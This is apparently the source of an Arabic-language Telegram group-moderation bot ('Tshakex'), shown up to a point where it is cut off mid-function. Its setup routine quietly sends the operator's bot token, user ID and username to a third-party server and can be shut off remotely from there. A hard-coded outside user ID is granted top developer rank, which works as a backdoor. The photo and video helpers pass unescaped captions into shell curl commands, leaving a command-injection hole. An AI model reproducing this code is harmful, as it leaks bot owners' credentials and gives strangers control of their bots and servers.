http = require("socket.http")
https = require("ssl.https")
JSON = dofile("./lib/dkjson.lua")
json = dofile("./lib/JSON.lua")
URL = dofile("./lib/url.lua")
serpent = dofile("./lib/serpent.lua")
redis = dofile("./lib/redis.lua").connect("127.0.0.1", 6379)
Server_Devid = io.popen("echo $SSH_CLIENT  awk '{ print $1}'"):read('*a')
------------------------------------------------------------------------------------------------------------
local function Load_File()
local f = io.open("./Info_Sudo.lua", "r")  
if not f then   
if not redis:get(Server_Devid.."Token_Devbot") then
io.write('\n\27[1;35mSend Token For Bot : ارسل توكن البوت ...\n\27[0;39;49m')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31mToken Is Communication Error\n التوكن غلط جرب مره اخره \n\27[0;39;49m')
else
io.write('\n\27[1;31m• Done Save Token : تم حفظ التوكن \n\27[0;39;49m')
redis:set(Server_Devid.."Token_Devbot",token)
end 
else
io.write('\n\27[1;31mToken was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
end 
os.execute('lua Tshakex.lua')
end
------------------------------------------------------------------------------------------------------------
if not redis:get(Server_Devid.."User_Devbots1") then
io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
local User_Sudo = io.read():gsub('@','')
if User_Sudo ~= '' then
local GetInfoUser = https.request("https://devstorm.ml/Tshakex/source/?id="..User_Sudo)
local User_Info = JSON.decode(GetInfoUser) 
if User_Info.Info.Chek == "is_block" then
io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
os.exit()
end
if User_Info.Info.Chek == "Not_Info" then
io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
os.execute('lua Tshakex.lua')
end
if User_Info.Info == 'Channel' then
io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
os.execute('lua Tshakex.lua')
end
io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف  واستخراج ايدي المطور الاساسي \n\27[0;39;49m')
print(User_Info.Info.Username,User_Info.Info.Id)
redis:set(Server_Devid.."User_Devbots1",User_Info.Info.Username)
redis:set(Server_Devid.."Id_Devbotsid",User_Info.Info.Id)
https.request("https://devstorm.ml/Tshakex/insert/?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..redis:get(Server_Devid.."Token_Devbot"))
else
io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
end 
os.execute('lua Tshakex.lua')
end

------------------------------------------------------------------------------------------------------------
local Dev_Info_Sudo = io.open("Info_Sudo.lua", 'w')
Dev_Info_Sudo:write([[
do 
local File_Info = {
id_dev = ]]..redis:get(Server_Devid.."Id_Devbotsid")..[[,
UserName_dev = "]]..redis:get(Server_Devid.."User_Devbots1")..[[",
Token_Bot = "]]..redis:get(Server_Devid.."Token_Devbot")..[["
}
return File_Info
end

]])
Dev_Info_Sudo:close()
------------------------------------------------------------------------------------------------------------
local Run_File_Tshakex = io.open("Tshake", 'w')
Run_File_Tshakex:write([[
#!/usr/bin/env bash
cd $HOME/Tshake
token="]]..redis:get(Server_Devid.."Token_Devbot")..[["
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Tshakex.lua -p PROFILE --bot=$token
done
]])
Run_File_Tshakex:close()
------------------------------------------------------------------------------------------------------------
local Run_SM = io.open("ts", 'w')
Run_SM:write([[
#!/usr/bin/env bash
cd $HOME/Tshake
while(true) do
rm -fr ../.telegram-cli
screen -S Tshakex -X kill
screen -S Tshakex ./Tshake
done
]])
Run_SM:close()
os.execute('chmod +x tg')
os.execute('chmod +x ts')
os.execute('chmod +x Tshake')
os.execute('./ts')
Status = true
else   
f:close()  
redis:del(Server_Devid.."Token_Devbot");redis:del(Server_Devid.."Id_Devbotsid");redis:del(Server_Devid.."User_Devbots1")
Status = false
end  
return Status
end
Load_File()
------------------------------------------------------------------------------------------------------------
sudos = dofile("./Info_Sudo.lua")
token = sudos.Token_Bot
UserName_Dev = sudos.UserName_dev
bot_id = token:match("(%d+)")  
Id_Dev = tonumber(sudos.id_dev)
Ids_Dev = {Id_Dev,bot_id,633004612}
Name_Bot = (redis:get(bot_id.."Tshakex:Redis:Name:Bot") or "FDFGERB")
------------------------------------------------------------------------------------------------------------
function var(value)  
print(serpent.block(value, {comment=false}))   
end 
function dl_cb(arg,data)
-- var(data)  
end
------------------------------------------------------------------------------------------------------------
function Bot(msg)  
local idbot = false  
if msg.sender_user_id_ == bot_id then  
idbot = true  
end  
return idbot  
end 
function Dev_Bots(msg)  
local Dev_Bots = false  
for k,v in pairs(Ids_Dev) do  
if msg.sender_user_id_ == v then  
Dev_Bots = true  
end  
end  
return Dev_Bots  
end 
function Dev_Bots_User(user)  
local Dev_Bots_User = false  
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_Bots_User = true  
end  
end  
return Dev_Bots_User  
end 
function DeveloperBot12(user)  
local Dev_Bots_User1 = false  
local Status = redis:sismember(bot_id.."Tshakex:Developer:Bot1", user) 
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_Bots_User1 = true  
end  
end  
return Dev_Bots_User1  
end 
function DeveloperBot1(msg) 
local Status = redis:sismember(bot_id.."Tshakex:Developer:Bot1", msg.sender_user_id_) 
if Status or Dev_Bots(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
function DeveloperBot(msg) 
local Status = redis:sismember(bot_id.."Tshakex:Developer:Bot", msg.sender_user_id_) 
if Status or Dev_Bots(msg) or DeveloperBot1(msg) or Bot(msg) then    
return true  
else  
return false  
end  
end
function PresidentGroup(msg)
local hash = redis:sismember(bot_id.."Tshakex:President:Group"..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or Bot(msg) then    
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = redis:sismember(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Bot(msg) then       
return true    
else    
return false    
end 
end
function Owner(msg)
local hash = redis:sismember(bot_id..'Tshakex:Manager:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Bot(msg) then       
return true    
else    
return false    
end 
end
function Admin(msg)
local hash = redis:sismember(bot_id..'Tshakex:Admin:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Bot(msg) then       
return true    
else    
return false    
end 
end
function Vips(msg)
local hash = redis:sismember(bot_id..'Tshakex:Vip:Group'..msg.chat_id_,msg.sender_user_id_) 
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Admin(msg) or Bot(msg) then       
return true 
else 
return false 
end 
end
------------------------------------------------------------------------------------------------------------
function Rank_Checking(user_id,chat_id)
if Dev_Bots_User(user_id) then
Status = true  
elseif tonumber(user_id) == tonumber(bot_id) then  
Status = true  
elseif redis:sismember(bot_id.."Tshakex:Developer:Bot1", user_id) then
Status = true  
elseif redis:sismember(bot_id.."Tshakex:Developer:Bot", user_id) then
Status = true  
elseif redis:sismember(bot_id.."Tshakex:President:Group"..chat_id, user_id) then
Status = true
elseif redis:sismember(bot_id..'Tshakex:Constructor:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Tshakex:Manager:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Tshakex:Admin:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Tshakex:Vip:Group'..chat_id, user_id) then  
Status = false  
else  
Status = false  
end  
return Status
end 
------------------------------------------------------------------------------------------------------------
function Get_Rank(user_id,chat_id)
if Dev_Bots_User(user_id) == true then
Status = "المطور الاساسي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
Status = "انا البوت :) "
elseif redis:sismember(bot_id.."Tshakex:Developer:Bot1", user_id) then
Status = redis:get(bot_id.."Tshakex:Developer:Bot:Reply"..chat_id) or "مطور ثانوي"  
elseif redis:sismember(bot_id.."Tshakex:Developer:Bot", user_id) then
Status = redis:get(bot_id.."Tshakex:Developer:Bot:Reply"..chat_id) or "مطور "  
elseif redis:sismember(bot_id.."Tshakex:President:Group"..chat_id, user_id) then
Status = redis:get(bot_id.."Tshakex:President:Group:Reply"..chat_id) or "المنشئ اساسي"
elseif redis:sismember(bot_id..'Tshakex:Constructor:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Tshakex:Constructor:Group:Reply"..chat_id) or "المنشئ"  
elseif redis:sismember(bot_id..'Tshakex:Manager:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Tshakex:Manager:Group:Reply"..chat_id) or "المدير"  
elseif redis:sismember(bot_id..'Tshakex:Admin:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Tshakex:Admin:Group:Reply"..chat_id) or "الادمن"  
elseif redis:sismember(bot_id..'Tshakex:Vip:Group'..chat_id, user_id) then  
Status = redis:get(bot_id.."Tshakex:Vip:Group:Reply"..chat_id) or "المميز"  
else  
Status = redis:get(bot_id.."Tshakex:Mempar:Group:Reply"..chat_id) or "العضو"
end  
return Status
end 
------------------------------------------------------------------------------------------------------------
function ChekBotAdd(chat_id)
if redis:sismember(bot_id.."Tshakex:ChekBotAdd",chat_id) then
Status = true
else 
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function MutedGroups(Chat_id,User_id) 
if redis:sismember(bot_id.."Tshakex:Silence:User:Group"..Chat_id,User_id) then
Status = true
else
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function RemovalUserGroup(Chat_id,User_id) 
if redis:sismember(bot_id.."Tshakex:Removal:User:Group"..Chat_id,User_id) then
Status = true
else
Status = false
end
return Status
end 
------------------------------------------------------------------------------------------------------------
function RemovalUserGroups(User_id) 
if redis:sismember(bot_id.."Tshakex:Removal:User:Groups",User_id) then
Status = true
else
Status = false
end
return Status
end
function SilencelUserGroups(User_id) 
if redis:sismember(bot_id.."Tshakex:Silence:User:Groups",User_id) then
Status = true
else
Status = false
end
return Status
end
function SilencelUserGroupsked(User_id) 
if redis:sismember(bot_id.."Tshakex:Silence:User:Groups",User_id) then
Status = true
else
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function send(chat_id, reply_to_message_id, text)
local text1 = redis:get(bot_id..'Tshakex:new:sourse1') or '━━━━━━━━'
local text2 = redis:get(bot_id..'Tshakex:new:sourse2') or '•'
text = string.gsub(text,"━━━━━━━━",text1)
text = string.gsub(text,"•",text2)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
function send1(chat_id, reply_to_message_id, text)
local text1 = redis:get(bot_id..'Tshakex:new:sourse1') or '━━━━━━━━'
local text2 = redis:get(bot_id..'Tshakex:new:sourse2') or '•'
text = string.gsub(text,"━━━━━━━━",text1)
text = string.gsub(text,"•",text2)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 0,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
function send2(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 0,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
------------------------------------------------------------------------------------------------------------
function Delete_Message(chat,id)
pcall(tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil))
end
------------------------------------------------------------------------------------------------------------
function DeleteMessage_(chat,id,func)
pcall(tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function getInputFile(file) 
if file:match("/") then 
infile = {ID = "InputFileLocal", 
path_ = file} 
elseif file:match("^%d+$") then 
infile = {ID = "InputFileId", 
id_ = file} 
else infile = {ID = "InputFilePersistentId", 
persistent_id_ = file} 
end 
return infile 
end
------------------------------------------------------------------------------------------------------------
function RestrictChat(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
------------------------------------------------------------------------------------------------------------
function Get_Api(Info_Web) 
local Info, Res = https.request(Info_Web) 
local Req = json:decode(Info) 
if Res ~= 200 then 
return false 
end 
if not Req.ok then 
return false 
end 
return Req 
end 
------------------------------------------------------------------------------------------------------------
function sendText(chat_id, text, reply_to_message_id, markdown) 
Status_Api = "https://api.telegram.org/bot"..token 
local Url_Api = Status_Api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
Url_Api = Url_Api .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
Url_Api = Url_Api.."&parse_mode=Markdown" 
elseif markdown == "html" then 
Url_Api = Url_Api.."&parse_mode=HTML" 
end 
return Get_Api(Url_Api)  
end
------------------------------------------------------------------------------------------------------------
function send_inline_keyboard(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local Status_Api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
Status_Api = Status_Api.."&reply_to_message_id="..reply_id 
end 
return Get_Api(Status_Api) 
end
answerInlineQuery = function (inline_query_id,getup)
var(getup)
Rep= "https://api.telegram.org/bot"..token.. '/answerInlineQuery?inline_query_id=' .. inline_query_id ..'&results=' .. URL.escape(JSON.encode(getup))..'&cache_time=' .. 1
return Get_Api(Rep)
end
sendPhotoURL = function(chat_id,ii, photo, caption,markdown)
if markdown == 'md' or markdown == 'markdown' then
ps = 'Markdown'
elseif markdown == 'html' then
ps = 'HTML'
end
local send = "https://api.telegram.org/bot"..token..'/sendPhoto'
local curl_command = 'curl -s "'..send..'" -F "chat_id='..chat_id..'" -F "reply_to_message_id='..ii..'" -F "photo='..photo..'" -F "parse_mode='..ps..'" -F "caption='..caption..'"'
return io.popen(curl_command):read('*all')
end
sendvideoURL = function(chat_id,ii, video, caption,markdown)
if markdown == 'md' or markdown == 'markdown' then
ps = 'Markdown'
elseif markdown == 'html' then
ps = 'HTML'
end
local send = "https://api.telegram.org/bot"..token..'/sendVideo'
local curl_command = 'curl -s "'..send..'" -F "chat_id='..chat_id..'" -F "reply_to_message_id='..ii..'" -F "video='..video..'" -F "parse_mode='..ps..'" -F "caption='..caption..'"'
return io.popen(curl_command):read('*all')
end
------------------------------------------------------------------------------------------------------------
function GetInputFile(file)  
local file = file or ""   
if file:match("/") then  
infile = {ID= "InputFileLocal", path_  = file}  
elseif file:match("^%d+$") then  
infile ={ID="InputFileId",id_=file}  
else infile={ID="InputFilePersistentId",persistent_id_ = file}  
end 
return infile 
end
------------------------------------------------------------------------------------------------------------
function sendPhoto(chat_id,reply_id,photo,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessagePhoto",
photo_ = GetInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption or ""
}
},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendVoice(chat_id,reply_id,voice,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVoice",
voice_ = GetInputFile(voice),
duration_ = "",
waveform_ = "",
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendAnimation(chat_id,reply_id,animation,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAnimation",
animation_ = GetInputFile(animation),
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendAudio(chat_id,reply_id,audio,title,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAudio",
audio_ = GetInputFile(audio),
duration_ = "",
title_ = title or "",
performer_ = "",
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendSticker(chat_id,reply_id,sticker,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageSticker",
sticker_ = GetInputFile(sticker),
width_ = 0,
height_ = 0
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendVideo(chat_id,reply_id,video,caption,func)
pcall(tdcli_function({ 
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 0,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVideo",  
video_ = GetInputFile(video),
added_sticker_file_ids_ = {},
duration_ = 0,
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendDocument(chat_id,reply_id,document,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageDocument",
document_ = GetInputFile(document),
caption_ = caption
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function KickGroup(chat,user)
pcall(tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil))
end
------------------------------------------------------------------------------------------------------------
function Send_Options(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "ramses20")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch
end
if status == "Close_Status" then
send(msg.chat_id_, msg.id_,"• بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."")
return false
end
if status == "Close_Status_Ktm" then
send(msg.chat_id_, msg.id_,"• بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n• خاصية ← الكتم\n")
return false
end
if status == "Close_Status_Kick" then
send(msg.chat_id_, msg.id_,"• بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n• خاصية ← الطرد\n")
return false
end
if status == "Close_Status_Kid" then
send(msg.chat_id_, msg.id_,"• بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n• خاصية ← التقييد\n")
return false
end
if status == "Open_Status" then
send(msg.chat_id_, msg.id_,"• بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
if status == "reply" then
send(msg.chat_id_, msg.id_,"• المستخدم ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
if status == "reply_Add" then
send(msg.chat_id_, msg.id_,"• بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"•  لا يمكن الوصول لمعلومات الشخص")
end
end,nil)   
end
function Send_Optionspv(chat,idmsg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "ramses20")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch
end
if status == "reply_Pv" then
send(chat,idmsg,"• المستخدم ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
else
send(chat,idmsg,"•  لا يمكن الوصول لمعلومات الشخص")
end
end,nil)   
end
------------------------------------------------------------------------------------------------------------
function Total_message(Message)  
local MsgText = ''  
if tonumber(Message) < 100 then 
MsgText = 'تفاعل قليل ' 
elseif tonumber(Message) < 200 then 
MsgText = 'تفاعلك ضعيف '
elseif tonumber(Message) < 400 then 
MsgText = 'يجي اتفاعل ' 
elseif tonumber(Message) < 700 then 
MsgText = 'مستوى مستوى ' 
elseif tonumber(Message) < 1200 then 
MsgText = 'ملك التفاعل ' 
elseif tonumber(Message) < 2000 then 
MsgText = 'لازم يعطونك مشرف والله' 
elseif tonumber(Message) < 3500 then 
MsgText = 'اساس لتفاعل '  
elseif tonumber(Message) < 4000 then 
MsgText = 'متفاعل مرا' 
elseif tonumber(Message) < 4500 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(Message) < 5500 then 
MsgText = 'وش لتفاعل استمر' 
elseif tonumber(Message) < 7000 then 
MsgText = 'غبنه وربي ' 
elseif tonumber(Message) < 9500 then 
MsgText = 'شت يا تفاعل' 
elseif tonumber(Message) < 10000000000 then 
MsgText = 'تفاعل نار وشرار'  
end 
return MsgText 
end
------------------------------------------------------------------------------------------------------------
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function download(url,name)
if not name then
name = url:match('([^/]+)$')
end
if string.find(url,'https') then
data,res = https.request(url)
elseif string.find(url,'http') then
data,res = http.request(url)
else
return 'The link format is incorrect.'
end
if res ~= 200 then
return 'check url , error code : '..res
else
file = io.open(name,'wb')
file:write(data)
file:close()
print('Downloaded :> '..name)
return './'..name
end
end
------------------------------------------------------------------------------------------------------------
function NotSpam(msg,Type)
if Type == "kick" then 
Send_Options(msg,msg.sender_user_id_,"reply","• قام بالتكرار هنا وتم طرده")  
KickGroup(msg.chat_id_,msg.sender_user_id_) 
return false  
end 
if Type == "del" then 
Delete_Message(msg.chat_id_,{[0] = msg.id_})    
return false
end 
if Type == "keed" then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_) 
Send_Options(msg,msg.sender_user_id_,"reply","• قام بالتكرار هنا وتم تقييده")  
return false  
end  
if Type == "mute" then
Send_Options(msg,msg.sender_user_id_,"reply","• قام بالتكرار هنا وتم كتمه")  
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_) 
return false  
end
end  
------------------------------------------------------------------------------------------------------------
function GetFile_Bot(msg)
local list = redis:smembers(bot_id..'Tshakex:ChekBotAdd') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'FDFGERB Chat'
link = redis:get(bot_id.."Tshakex:link:set:Group"..msg.chat_id_) or ''
ASAS = redis:smembers(bot_id..'Tshakex:President:Group'..v)
MNSH = redis:smembers(bot_id..'Tshakex:Constructor:Group'..v)
MDER = redis:smembers(bot_id..'Tshakex:Manager:Group'..v)
MOD = redis:smembers(bot_id..'Tshakex:Admin:Group'..v)
if k == 1 then
t = t..'"'..v..'":{"FDFGERB":"'..NAME..'",'
else
t = t..',"'..v..'":{"FDFGERB":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, './'..bot_id..'.json','• عدد مجموعات التي في البوت { '..#list..'}')  
end
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_,"• ملف نسخه ليس لهذا البوت")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," جاري ...\n رفع الملف الان")
else
send(chat,msg.id_,"*• عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")   
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
for idg,v in pairs(groups.GP_BOT) do
redis:sadd(bot_id..'Tshakex:ChekBotAdd',idg)  
redis:set(bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
redis:set(bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
redis:sadd(bot_id..'Tshakex:Constructor:Group'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
redis:sadd(bot_id..'Tshakex:Manager:Group'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
redis:sadd(bot_id..'Tshakex:Admin:Group'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
redis:sadd(bot_id..'Tshakex:President:Group'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n•تم رفع الملف بنجاح وتفعيل المجموعات\n• ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")   
end
function AddChannel(User)
local var = true
if redis:get(bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..redis:get(bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end

------------------------------------------------------------------------------------------------------------
function Dev_Bots_File(msg,data)
if msg then
text = msg.content_.text_
function Bot(msg)  
local idbot = false  
if msg.sender_user_id_ == bot_id then  
idbot = true  
end  
return idbot  
end 
function Dev_Bots(msg)  
local Dev_Bots = false  
for k,v in pairs(Ids_Dev) do  
if msg.sender_user_id_ == v then  
Dev_Bots = true  
end  
end  
return Dev_Bots  
end 
function Dev_Bots_User(user)  
local Dev_Bots_User = false  
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_Bots_User = true  
end  
end  
return Dev_Bots_User  
end 
function DeveloperBot1(msg) 
local Status = redis:sismember(bot_id.."Tshakex:Developer:Bot1", msg.sender_user_id_) 
if Status or Dev_Bots(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
function DeveloperBot(msg) 
local Status = redis:sismember(bot_id.."Tshakex:Developer:Bot", msg.sender_user_id_) 
if Status or Dev_Bots(msg) or DeveloperBot1(msg) or Bot(msg) then    
return true  
else  
return false  
end  
end
function PresidentGroup(msg)
local hash = redis:sismember(bot_id.."Tshakex:President:Group"..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or Bot(msg) then    
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = redis:sismember(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, msg.sender_user_id_) 
